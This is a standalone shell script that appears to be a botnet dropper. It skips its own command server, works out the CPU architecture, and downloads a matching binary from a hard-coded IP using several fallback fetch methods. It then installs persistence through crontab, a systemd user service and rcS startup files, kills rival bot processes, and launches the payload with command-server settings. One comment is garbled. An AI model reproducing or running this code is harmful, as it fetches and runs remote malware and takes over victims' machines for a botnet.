#!/bin/sh
# self-infection guard: never install this bot on the CNC itself
if [ "$(hostname)" = "bubbly-plate" ]; then exit 0; fi
T="$1"; [ -z "$T" ] && T="vps"
SRV=108.165.95.10
A=$(uname -m)
case "$A" in
  x86_64|amd64) A=x86_64;;
  i386|i486|i586|i686) A=i686;;
  aarch64|arm64) A=aarch64;;
  armv7*) A=armv7l;; armv6*) A=armv6l;; armv5*|armv4*) A=armv6l;;
  mips64*) A=mips;;
  mips) A=mips;;
  mipsel) A=mipsel;;
  *) A=x86_64;;
esac
fetch() {
  rm -f "$1" 2>/dev/null
  wget -qO "$1" "http://$SRV/$2" 2>/dev/null || curl -s -o "$1" "http://$SRV/$2" 2>/dev/null
  [ -s "$1" ] || busybox wget -qO "$1" "http://$SRV/$2" 2>/dev/null
  [ -s "$1" ] || { command -v python3 >/dev/null 2>&1 && python3 -c 'import urllib.request,sys;urllib.request.urlretrieve(sys.argv[1],sys.argv[2])' "http://$SRV/$2" "$1" 2>/dev/null; }
  [ -s "$1" ] && chmod 777 "$1" 2>/dev/null && return 0
  return 1
}
persist() {
  [ -s .g ] || return 0
  H=${HOME:-/tmp}
  cp -f .g "$H/.gd" 2>/dev/null; chmod 777 "$H/.gd" 2>/dev/null
  CRONCMD="* * * * * pgrep -f '.gd $T' >/dev/null 2>&1 || (cd $H 2>/dev/null && setsid ./.gd $T >/dev/null 2>&1 </dev/null &)"
  (crontab -l 2>/dev/null | grep -v '\.gd\|\.c\|l\.sh'; echo "@reboot $H/.gd $T >/dev/null 2>&1 </dev/null &"; echo "$CRONCMD") | crontab - 2>/dev/null
  grep -q '\.gd' "$H/.bashrc" 2>/dev/null || echo "setsid $H/.gd $T >/dev/null 2>&1 </dev/null &" >> "$H/session.log" 2>/dev/null
  mkdir -p "$H/.config/systemd/user" 2>/dev/null
  printf '[Unit]\nDescription=gd\n[Service]\nExecStart=%s/.gd %s\nRestart=always\n[Install]\nWantedBy=default.target\n' "$H" "$T" > "$H/.config/systemd/user/gd.service" 2>/dev/null
  systemctl --user enable --now gd.service 2>/dev/null
  for d in /mnt/mtd /mnt/sd /data; do
    if [ -w "$d" ]; then cp -f .g "$d/.gd" 2>/dev/null; chmod 777 "$d/.gd" 2>/dev/null; echo "$d/.gd $T >/dev/null 2>&1 </dev/null &" >> "$d/rcS" 2>/dev/null; fi
  done
  return 0
}
try_run() {
  d="$1"; b="$2"; tag="$3"
  [ -d "$d" ] || return 1
  # the already alive? (the bot's own pidfile, the survives the daemonize + the disguise)
  
  
  cd "$d" 2>/dev/null || return 1
  fetch .g "$b" || return 1
  persist
  kill $(cat /tmp/.guardian.pid 2>/dev/null) 2>/dev/null; kill $(cat /var/tmp/.grd1an.pid 2>/dev/null) 2>/dev/null; sleep 1
  setsid env CNC_IP=$SRV CNC_PORT=80 ./.g "$tag" >/dev/null 2>&1 </dev/null &
  sleep 2
  if [ -f /tmp/.guardian.pid ] && kill -0 $(cat /tmp/.guardian.pid 2>/dev/null) 2>/dev/null; then exit 0; fi
  if [ -f /var/tmp/.grd1an.pid ] && kill -0 $(cat /var/tmp/.grd1an.pid 2>/dev/null) 2>/dev/null; then exit 0; fi
  if pgrep -f "$d/.g" >/dev/null 2>&1; then exit 0; fi
  return 1
}
if [ "$A" = "mips" ]; then
  for d in /tmp /dev/shm /var/tmp /run /mnt; do
    try_run "$d" mips "$T"
    try_run "$d" mipsel "$T"
  done
else
  for d in /tmp /dev/shm /var/tmp /run /mnt; do
    try_run "$d" "$A" "$T"
  done
fi
exit 0
